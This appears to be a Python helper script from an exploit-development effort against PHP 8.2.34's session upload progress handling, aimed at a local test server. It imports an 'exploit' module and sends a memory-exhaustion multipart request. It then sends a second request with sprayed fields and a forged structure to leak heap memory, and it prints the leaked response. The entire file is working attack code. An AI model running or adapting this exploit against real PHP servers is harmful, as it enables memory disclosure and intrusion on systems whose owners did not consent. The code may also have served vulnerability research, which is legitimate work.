"""Dump the FULL leak-response body on 8.2.34 to see the complete session error."""
import sys, os, time, struct
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E

URL = "http://127.0.0.1:18111/"
t = E.Target(URL, timeout=90.0, verbose=False)
# OOM trigger
parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
parts += [
    {"name": "PHPSESSID", "data": b"\x00"},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    {"name": "f", "filename": "a.txt", "data": b"A" * 64},
    {"name": "big", "data": b"B" * (12 * 1024 * 1024)},
]
t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=90.0)
time.sleep(0.4)
# leak request
parts = [
    {"name": "PHPSESSID", "data": E.SID},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
]
for i in range(841):
    val = (f"v{i:04d}" + "x" * 44)[:48]
    parts.append({"name": str(1000 + i), "data": val.encode()})
forge = bytearray(b"A" * 79)
struct.pack_into("<Q", forge, 0x10, 0x1000)
forge[0x18] = ord("L")
parts.append({"name": "1999", "data": bytes(forge)})
r2 = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=90.0)
print("=== FULL leak response (8.2.34) ===", flush=True)
print(r2.decode("latin1"), flush=True)
